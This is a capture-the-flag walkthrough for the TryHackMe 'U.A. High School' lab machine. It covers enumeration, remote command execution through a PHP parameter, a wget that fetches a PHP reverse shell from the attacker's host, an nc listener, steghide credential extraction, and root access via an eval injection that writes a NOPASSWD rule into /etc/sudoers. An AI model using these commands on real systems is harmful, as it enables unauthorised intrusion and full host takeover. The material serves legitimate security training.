# U.A. High School Walkthrough
<br/>

## Intro
Welcome into the U.A. High School challenge, you can find it on TryHackMe [here](https://tryhackme.com/r/room/yueiua).
This challenge is about enumeration and exploitation of a simple web-app to gain a foot hold, then apply some privilege escalation techniques to become root and read the flag.

Here is the story:
"*Join us in the mission to protect the digital world of superheroes! U.A., the most renowned Superhero Academy, is looking for a superhero to test the security of our new site.*
*Our site is a reflection of our school values, designed by our engineers with incredible Quirks. We have gone to great lengths to create a secure platform that reflects the exceptional education of the U.A.*"

Whenever you feel ready press "Start Machine" and connect via OpenVPN or use the AttackBox.

Lets begin!

<br/>
<br/>

## The Challenge
Let's add the IP to the hosts file for commodity:
```bash
echo "MACHINE-IP school.thm" | sudo tee -a /etc/hosts
```

Let's enumerate open ports with an *nmap* scan:
```bash
nmap -sV school.thm
```

Here is the result of the scan:
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
```

Let's go to take a look at the website hosted on port 80 with our browser.
From the homepage nothing seems really interesting to me, let's try to enumerate hidden directories and check if there are any subdomains using gobuster.
The subdomain scan with either `dns` and `vhost` gives us no matches.
```bash
gobuster vhost -u http://school.thm -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 50 --append-domain
```

```bash
gobuster dir -u http://school.thm/  -w /usr/share/wordlists/dirb/common.txt -t 50
```
Only the index.html page is accessible, which is the homepage we have already visited. We have another interesting thing tho, the `assets` directory give us a 301 code which means there is a redirection.
Scanning this directory we can find `/images` but if we try to navigate it we get blocked, we need permissions to access the resource, also a file appears `index.php` which somehow is empty.

Looking online i found that this can lead to some vulnerabilities, like local file inclusion and we can actually manipulate the URL to pass commands:
```
http://school.thm/assets/index.php?page=php://input&cmd=whoami
```

Sending this query we get:
```
d3d3LWRhdGEK
```
which is `www-data` encoded in base64

Trying with some one-liner to get a reverse shell did not work, maybe we can upload a php reverse shell and trigger it.
I used the pentest-monkey one, in that directory start an http server:
```bash
python3 -m http.server 80     
```

With this query we can donwnload it to the webserver:
```
?cmd=wget%20http://YOUR-MACHINE-IP/rev_shell.php
```

Now set up a listener on your machine:
```bash
nc -lvnp 1234
```

Now to trigger it visit:
```
http://school.thm/assets/rev_shell.php
```

And we have the shell!

Now we can upgrade it to make it fully interactive, you can follow this [guide](https://github.com/Maat-Cyber/Maat-Cyber-World/blob/05a2498d79c3355f61c1cba18464ecacf1ec728a/Tips-%26-Resources/Reverse_Shell-Upgrade.md)


Investigating further i found this interesting file:
```bash
cat /var/www/Hidden_Content/passphrase.txt
```

`REDACTED` which is a base64 string, decoding it we get `REDACTED`, now we need to find what is this passphrase used for.

Looking inside the website directory we can access the /aseets/images one that was forbidden to us before.
We can set up a simple python web-server and download both the images to our machine, they might contain some clues.

One image is the background of the homepage, while the other one seems corrupted and it does not open, let's view why, we can check the file metadata:
```bash
exiftool oneforall.jpg
```
We get this message: "PNG image did not start with IHDR" 

This means that there is the wrong file singature or "magic number set" in the hex, we can open the file with an hex editor:
```
hexedit oneforall.jpg
```
And substiture the first 2 sets with: `FF D8 FF E0 00 10 4A 46`

Now if we try to open the image we can see it, now let's see if soemthing has been hidden inside:
```bash
steghide --info oneforall.jpg 
```
When prompted write `yes` and insert the passhprase, which is the one we found before.

We now know there is an embedded file called "creds.txt" inside the image, we can extract it wiith:
```bash
steghide extract -sf oneforall.jpg -p PASSWORD-FOUND-BEFORE
```

Let's view the creds file content:
```bash
cat creds.txt
```

```
Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:

deku:REDACTED
```

Now we have *deku* credentials, we can login into the machine has him using ssh:
```
ssh deku@school.thm
```

Once inside let's open the user flag:
```bash
cat user.txt
```


<br/>

### Privilege Escalation
We can check which commands we are allowed to run as sudo with:
```bash
sudo -l
```

```
User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh
```

Looks like we can run the feedback script as super user, let's understand what it does:
```bash
cat /opt/NewComponent/feedback.sh
```

```bash
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input." 
fi
```
It is a bash script which asks us to input a feedback into the terminal, it reads it and checks that it is not equal to some forbidden characters, if that condition is fulfilled it will print back to us our feedback and append it to the feedback.txt file (which from later search is actually a symlink to /dev/null), otherwise it tells us that the input is invalid.

The vulnerable part here is the `eval` function which execute as a command what is inside the double quotes, if we can manipulate that part we can use it to gain root privileges.

Let's run the script 
```bash
sudo /opt/NewComponent/feedback.sh
```

We can then input this feedback to edit the sudoers file and allow our user to run any command:
```
deku ALL=NOPASSWD: ALL >> /etc/sudoers
```

Now we can change user:
```bash
su root
```

Finally let's get the root flag:
```bash
cat /root/root.txt
```

<br/>
<br/>

Congratulations you have successfully exploited tehe high school's website and gained root privileges.

Catch you in the next CTF 😃 
